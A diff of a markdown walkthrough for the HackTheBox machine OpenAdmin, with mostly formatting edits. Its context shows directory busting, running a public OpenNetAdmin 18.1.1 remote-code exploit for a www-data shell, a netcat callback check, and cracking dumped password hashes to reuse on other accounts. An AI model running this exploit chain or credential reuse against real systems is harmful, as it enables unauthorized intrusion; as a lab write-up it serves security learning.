@@ -22,19 +22,19 @@ If you dirbust, you'll likely see these first few results (wordlist: `/usr/share
 /sierra (Status: 301)
 ```
 
-`/artwork` gives you nothing but some landing page for 'Arcwork'.
+`/artwork` gives you nothing but some landing page for 'Arcwork'.  
 `/music` gives you some landing page for a music company, but if you click the 'login' button at the top, you get redirected to _completely_ different-looking site at `/ona`.
 
 Now at this point, `/ona` looks sufficiently interesting for 2 reasons:
-1- It looks really different from its parent site at `/music` - in fact it's not even a sub-directory of `/music`, with the page located at `http://openadmin.htb/ona/`.
-2- There's a version number that almost literally pops right out at you - version 18.1.1. Now if you've done enough OSCP / HTB, version numbers are always a good place to start.
+1. It looks really different from its parent site at `/music` - in fact it's not even a sub-directory of `/music`, with the page located at `http://openadmin.htb/ona/`.
+2. There's a version number that almost literally pops right out at you - version 18.1.1. Now if you've done enough OSCP / HTB, version numbers are always a good place to start.
 
 ### Shell as www-data
 Googling `ona 18.1.1 exploit` should yield you [this first result](https://www.exploit-db.com/exploits/47691).
 
 The exploit basically gives you a shell with no feedback (as in no stdout). You can verify whether it works by triggering a callback to your machine.
 
-Example: running the exploit to point at `http://openadmin.htb/ona/` (note: somehow you must add a `\` at the end for this to work) and running a nc callback `nc -nc <ur_ip> 4444`
+Example: running the exploit to point at `http://openadmin.htb/ona/` and running a nc callback `nc -nc <ur_ip> 4444` (Note: somehow you must add a `\` at the end or the URL for this to work)
 ```
 kali@kali:~$ ./ona.sh http://openadmin.htb/ona/
 $ nc -nv 10.10.14.64 4444
@@ -95,7 +95,7 @@ id      username        password        level   ctime   atime
 1       guest   098f6bcd4621d373cade4e832627b4f6        0       2020-03-30 10:59:53     2020-03-30 10:59:53
 2       admin   21232f297a57a5a743894a0e4a801fc3        0       2007-10-30 03:00:17     2007-12-02 22:10:26
 ```
-If you cracked the `admin` hash, the password is 'admin', which if you try on SSH (with username `admin`), it fails. Also, if our reward for cracking the hash is `admin`, this very likely isn't the way to go.
+If you cracked the `admin` hash, the password is 'admin', which if you try on SSH (with username `admin`), it fails. Also, if our reward for cracking the hash is `admin`, this very likely isn't the way to go. ¯\_(ツ)_/¯
 
 One thing to do if you have passwords is always to try them on other users. To do that, first we gotta find out users with access to the box. One of the easiest ways is to see which users are listed in the `/home` directory.
 ```
